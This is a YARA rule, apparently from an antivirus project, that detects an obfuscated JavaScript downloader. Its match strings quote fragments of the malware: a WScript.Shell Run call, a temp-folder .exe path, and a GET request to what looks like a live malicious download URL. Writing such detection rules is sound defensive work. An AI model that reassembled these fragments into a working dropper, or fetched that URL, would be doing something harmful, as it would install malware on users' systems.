rule sig_20160330_fc9a7c1910edde41044f70e3d43b78dc {
  meta:
    description = "datamaliciousorder - file 20160330_fc9a7c1910edde41044f70e3d43b78dc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "74e36eee540034173dc9d7275fd8b1b530532415f1abe851859333a61325a106"

  strings:
    $s1  = "function DY(UO, S0){L0 = L0 * 1; return UO - S0;};" fullword ascii
    $s2  = "var AG = function B() {return WScript[U](\"WScript\"+\".Shell\");}(), ML = 11;" fullword ascii
    $s3  = "ZQ[L](\"GET\", \"http://zakaz-sharikov.ru/x9dslp\", false);" fullword ascii
    $s4  = "if (ZQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IT() {return AG[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"4ZCMn4C6uR5XJgK.ex\" + \"e\";};" fullword ascii
    $s6  = "function SX(){return X + \"\";};" fullword ascii
    $s7  = "function N(IR){AG[\"Run\"](IR, L0, L0);};" fullword ascii
    $s8  = "function W() {return ((WK == true) && (WK == DF)) ? 1 : L0;};" fullword ascii
    $s9  = "function Z(){return 22;};" fullword ascii
    $s10 = "function K()" fullword ascii
    $s11 = "var AN = new this[\"Date\"]();" fullword ascii
    $s12 = "function G(MF) {var YN = (1, 2, 3, 4, 5, MF); return YN;};" fullword ascii
    $s13 = "function KS(){return U;};" fullword ascii
    $s14 = "return DY(R, N0);" fullword ascii
    $s15 = "}while (ZK);" fullword ascii
    $s16 = "var WK = false;" fullword ascii
    $s17 = "WK = true; " fullword ascii
    $s18 = "var EH = false;" fullword ascii
    $s19 = "DF = true; " fullword ascii
    $s20 = "var DF = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}